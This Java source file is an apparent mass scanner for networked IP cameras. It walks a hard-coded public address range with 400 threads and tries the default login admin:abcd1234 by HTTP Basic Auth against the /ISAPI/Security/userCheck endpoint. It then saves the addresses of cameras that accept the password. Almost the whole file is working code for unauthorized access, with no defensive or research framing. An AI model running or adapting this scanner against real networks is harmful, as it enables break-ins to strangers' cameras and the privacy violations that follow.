package com.cam;

import com.cam.model.CamInfo;
import com.cam.util.FileService;
import com.cam.util.IPAddress;
import com.cam.util.IPService;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.ZonedDateTime;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.logging.Logger;

public class Main {

    private final String DEFAULT_USER = "admin";

    private int NUMBER_OF_THREADS = 400;

    private final String END_URL = "/ISAPI/Security/userCheck";

    private final String SCHEMA = "http://";

    private final String START_RANGE = "115.72.0.0";

    private final String END_RANGE = "115.79.255.255";

    private final List<String> items = Arrays.asList("web", "App-webs/", "Webs", "DNVRS-Webs", "webserver");

    String[] normalPass = {"abcd1234"};

    static Logger logger = Logger.getLogger(Main.class.getName());

    public static void main(String[] args) {
        logger.info("Hello world of Cam!");

        Main main = new Main();

        List<String> camIps = new ArrayList<>();

        List<String> allIps = new ArrayList<>();

        IPAddress startIp = new IPAddress(main.START_RANGE);

        IPAddress endIp = new IPAddress(main.END_RANGE);

        logger.info("Finding......");

        do {
            allIps.add(startIp.toString());

            startIp = startIp.next();

        } while(!startIp.equals(endIp));

        logger.info("Total IPs [" + allIps.size() + "]");

        if (allIps.size() <= main.NUMBER_OF_THREADS) {
            main.NUMBER_OF_THREADS = allIps.size();
        }

        Thread [] threads = new Thread[main.NUMBER_OF_THREADS];

        final int ipPerThread = allIps.size()/ main.NUMBER_OF_THREADS;
        final int remainingIps = allIps.size() % main.NUMBER_OF_THREADS;

        long start = ZonedDateTime.now().toInstant().toEpochMilli();


        for (int t = 0; t <  main.NUMBER_OF_THREADS; t++) {
            final int thread = t;

            threads[t] = new Thread() {
                @Override
                public void run() {
                    main.runThread(allIps,  main.NUMBER_OF_THREADS, thread, ipPerThread, remainingIps, camIps);
                }
            };
        }

        for (Thread t1 : threads) {
            t1.start();
        }

        for (Thread t2 : threads) {
            try {
                t2.join();
            } catch (InterruptedException e) {

            }
        }

        long end = ZonedDateTime.now().toInstant().toEpochMilli();

        logger.info("TOTAL Time =" + (end-start)/1000 + "s");


        logger.info("Writing to file......");

        FileService fileService = new FileService();

        fileService.writeToFile(camIps, "src/resources/output.txt");

        /**
        List<String> ipFromTools = main.getIps();
        List<String> ipCamFromTools = new ArrayList<>();

        CamInfo camInfo = new CamInfo();

        for (String ip : ipFromTools) {

            if (main.checkCam(ip, camInfo)) {

                ipCamFromTools.add(main.SCHEMA + ip);

                System.out.println(main.SCHEMA + ip);

            }
        }

        if (ipCamFromTools.size() != 0) {

            fileService.writeToFile(ipCamFromTools, "src/resources/outputTools.txt");
        }

        **/
    }

    private int getNumberOfThread(int totalIp, int ipPerThread) {
        if (totalIp % ipPerThread == 0) {
            return totalIp/ipPerThread;
        } else {

            return totalIp/ipPerThread + 1;
        }
    }

    public void runThread(List<String> ips, int numberOfThreads, int thread, int ipsPerThread, int remainingIps, List<String> camIps) {

        IPService ipService = new IPService();

        List<String> inIps = new ArrayList<>();

        for (int i = thread * ipsPerThread; i < (thread + 1) * ipsPerThread; i++) {
            inIps.add(ips.get(i));
        }

        if (thread == numberOfThreads - 1 && remainingIps > 0) {
            for (int j = ips.size() - remainingIps; j < ips.size(); j ++) {
                inIps.add(ips.get(j));
            }
        }


        for (String ip : inIps) {
            try {

                //logger.info("processing " + ip + " in thread " + Thread.currentThread().getName());

                ipService.findCamIp(ip, camIps);
            } catch (Exception e) {

            }
        }



    }

    public List<String> getIps() {

        List<String> ips = new ArrayList<>();

        try {
            List<String> allLines = Files.readAllLines(Paths.get("src/resources/input.txt"));

            int i = 0;

            for (String line : allLines) {
                i++;

                if (i > 7 && i <= allLines.size()) {

                    String [] arr = line.split("\\s+");

                    if (items.stream().anyMatch(arr[1]::contains)) {
                        ips.add(arr[0]);
                    }
                }

            }
        } catch (IOException e) {
            e.printStackTrace();
        }

        return ips;
    }


    public boolean checkCam(String ip, CamInfo info) {

        boolean validURL = false;


        for (String pass : normalPass) {
            validURL = login(ip, pass);

            if (validURL) {

                info.setHost(ip);
                info.setPass(pass);

                break;
            }
        }

        return validURL;
    }

    public boolean login(String ip, String password) {

        boolean isLogin = false;

        try {

            URL url = new URL(SCHEMA + ip + END_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            String userpass = DEFAULT_USER + ":" + password;
            String basicAuth = "Basic " +  new String(Base64.getEncoder().encode(userpass.getBytes()));

            conn.setRequestMethod("GET");
            conn.setRequestProperty("Accept", "application/json");
            conn.setRequestProperty ("Authorization", basicAuth);
            conn.setConnectTimeout(2000);
            conn.setReadTimeout(2000);

            if (conn.getResponseCode() == 200) {
                isLogin = true;
            }

            conn.disconnect();

        } catch (MalformedURLException e) {

            e.printStackTrace();

        } catch (IOException e) {

            logger.info("time out " + ip);

        }

        return isLogin;

    }

}